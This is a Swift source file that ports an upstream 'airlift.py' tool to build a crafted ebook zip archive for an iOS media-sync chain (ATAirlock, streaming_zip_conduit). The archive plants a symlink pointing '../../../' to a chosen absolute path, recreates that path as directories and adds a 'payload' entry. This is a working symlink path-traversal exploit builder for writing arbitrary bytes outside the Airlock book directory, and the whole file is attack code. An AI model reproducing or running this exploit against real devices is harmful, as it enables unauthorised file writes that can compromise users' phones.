import Foundation

/// Airlock streaming-zip archive builder. Exact port of upstream
/// `build_archive` / `build_books` (airlift.py): the crafted ebook archive
/// the device-side `streaming_zip_conduit` + ATAirlock chain processes.
///
/// Layout (all STORED, create_system unix, fixed date 2026-09-14 05:00):
/// - `META-INF/` + `META-INF/com.apple.ZipMetadata.plist` (binary {Version:2})
/// - `p0/`, `p0/p1/`, `p0/p1/p2/`
/// - `p0/p1/p2/link` — symlink (`S_IFLNK`) to `../../../<target>`
/// - every `<target>` path component as a directory
/// - `payload` — the bytes to write
/// Every entry carries extra field `0x5A53` ("ZS", len 2, LE mode) and
/// external_attr = mode << 16.
enum AirlockArchive {
    static let extraID: UInt16 = 0x5A53
    static let airlockRoot = "/var/mobile/Media/Airlock/Book"

    // File modes from upstream (stat constants).
    static let modeDir: UInt16 = 0o040755
    static let modeFile: UInt16 = 0o100600
    static let modeLink: UInt16 = 0o120777

    enum ArchiveError: Error, Equatable {
        case unsafeTarget(String)
    }

    /// Port of `normalize_target`: absolute, non-root, no NUL, no ./..,
    /// at most 768 bytes.
    static func normalizeTarget(_ value: String) throws -> String {
        guard value.hasPrefix("/"), value != "/", !value.contains("\0") else {
            throw ArchiveError.unsafeTarget("target must be a non-root absolute directory")
        }
        // normpath-equivalent: collapse duplicate slashes (no .. resolution —
        // any dot component is rejected below like upstream).
        let collapsed = value.replacingOccurrences(of: "//", with: "/")
        let components = collapsed.dropFirst().split(separator: "/", omittingEmptySubsequences: false)
        if components.contains(where: { $0.isEmpty || $0 == "." || $0 == ".." }) {
            throw ArchiveError.unsafeTarget("target contains an unsafe path component")
        }
        guard collapsed.utf8.count <= 768 else {
            throw ArchiveError.unsafeTarget("target path is too long")
        }
        return collapsed
    }

    struct Entry {
        let name: String
        let mode: UInt16
        let data: Data
    }

    /// Entry list in exact upstream order (no archive I/O here — testable).
    static func entries(target: String, payload: Data) throws -> [Entry] {
        let normalized = try normalizeTarget(target)
        let tail = String(normalized.dropFirst())
        let metadata = try PropertyListSerialization.data(
            fromPropertyList: ["Version": 2], format: .binary, options: 0)
        var out: [Entry] = [
            Entry(name: "META-INF/", mode: modeDir, data: Data()),
            Entry(name: "META-INF/com.apple.ZipMetadata.plist", mode: modeFile, data: metadata),
        ]
        for directory in ["p0/", "p0/p1/", "p0/p1/p2/"] {
            out.append(Entry(name: directory, mode: modeDir, data: Data()))
        }
        out.append(Entry(name: "p0/p1/p2/link", mode: modeLink,
                         data: Data("../../../\(tail)".utf8)))
        var cursor = ""
        for component in tail.split(separator: "/") {
            cursor += component + "/"
            out.append(Entry(name: cursor, mode: modeDir, data: Data()))
        }
        out.append(Entry(name: "payload", mode: modeFile, data: payload))
        return out
    }

    /// Serializes entries to a zip (stored only). Byte layout mirrors
    /// CPython zipfile with the upstream ZipInfo settings.
    static func archiveData(entries: [Entry]) -> Data {
        var body = Data()
        var central: [Data] = []
        var offset: UInt32 = 0
        for entry in entries {
            let name = Data(entry.name.utf8)
            let extra = extraField(mode: entry.mode)
            let crc = crc32(entry.data)
            // Local header.
            var local = Data()
            local.appendLE(UInt32(0x04034b50))
            local.appendLE(UInt16(20))
            local.appendLE(UInt16(0x0800)) // UTF-8
            local.appendLE(UInt16(0))      // stored
            local.appendLE(UInt16(0x2800)) // mod time 05:00 (upstream date_time)
            local.appendLE(UInt16(0x5D2E)) // mod date 2026-09-14 (upstream date_time)
            local.appendLE(crc)
            local.appendLE(UInt32(entry.data.count))
            local.appendLE(UInt32(entry.data.count))
            local.appendLE(UInt16(name.count))
            local.appendLE(UInt16(extra.count))
            local.append(contentsOf: name)
            local.append(contentsOf: extra)
            body.append(contentsOf: local)
            body.append(contentsOf: entry.data)
            // Central record.
            var record = Data()
            record.appendLE(UInt32(0x02014b50))
            record.appendLE(UInt16(3 << 8 | 20)) // made by unix
            record.appendLE(UInt16(20))
            record.appendLE(UInt16(0x0800))
            record.appendLE(UInt16(0))
            record.appendLE(UInt16(0x2800))
            record.appendLE(UInt16(0x5D2E))
            record.appendLE(crc)
            record.appendLE(UInt32(entry.data.count))
            record.appendLE(UInt32(entry.data.count))
            record.appendLE(UInt16(name.count))
            record.appendLE(UInt16(extra.count))
            record.appendLE(UInt16(0)) // comment
            record.appendLE(UInt16(0)) // disk
            record.appendLE(UInt16(0)) // internal attr
            record.appendLE(UInt32(entry.mode) << 16) // external attr
            record.appendLE(offset)
            record.append(contentsOf: name)
            record.append(contentsOf: extra)
            central.append(record)
            offset += UInt32(local.count + entry.data.count)
        }
        let centralStart = offset
        var centralData = Data()
        for record in central { centralData.append(contentsOf: record) }
        var eocd = Data()
        eocd.appendLE(UInt32(0x06054b50))
        eocd.appendLE(UInt16(0))
        eocd.appendLE(UInt16(0))
        eocd.appendLE(UInt16(central.count))
        eocd.appendLE(UInt16(central.count))
        eocd.appendLE(UInt32(centralData.count))
        eocd.appendLE(centralStart)
        eocd.appendLE(UInt16(0))
        var out = body
        out.append(contentsOf: centralData)
        out.append(contentsOf: eocd)
        return out
    }

    static func extraField(mode: UInt16) -> Data {
        var out = Data()
        out.appendLE(extraID)
        out.appendLE(UInt16(2))
        out.appendLE(mode)
        return out
    }

    /// Port of `build_books`: binary plist {Books: [{Persistent ID, Item ID, DSID}]}.
    static func booksData(identifiers: [String]) throws -> Data {
        let rows = identifiers.enumerated().map { index, identifier in
            ["Persistent ID": identifier, "Item ID": String(index + 1), "DSID": "1"]
        }
        return try PropertyListSerialization.data(
            fromPropertyList: ["Books": rows], format: .binary, options: 0)
    }

    // MARK: - CRC-32 (same table as ZipArchive)

    static func crc32(_ data: Data) -> UInt32 {
        var crc: UInt32 = 0xffff_ffff
        for byte in data {
            crc = (crc >> 8) ^ AirlockCRC.table[Int((crc ^ UInt32(byte)) & 0xff)]
        }
        return crc ^ 0xffff_ffff
    }
}

private enum AirlockCRC {
    static let table: [UInt32] = {
        (0..<256).map { index in
            var value = UInt32(index)
            for _ in 0..<8 {
                value = (value & 1) == 1 ? (0xedb88320 ^ (value >> 1)) : (value >> 1)
            }
            return value
        }
    }()
}

private extension Data {
    mutating func appendLE(_ value: UInt16) {
        append(UInt8(value & 0xff))
        append(UInt8((value >> 8) & 0xff))
    }

    mutating func appendLE(_ value: UInt32) {
        append(UInt8(value & 0xff))
        append(UInt8((value >> 8) & 0xff))
        append(UInt8((value >> 16) & 0xff))
        append(UInt8((value >> 24) & 0xff))
    }
}
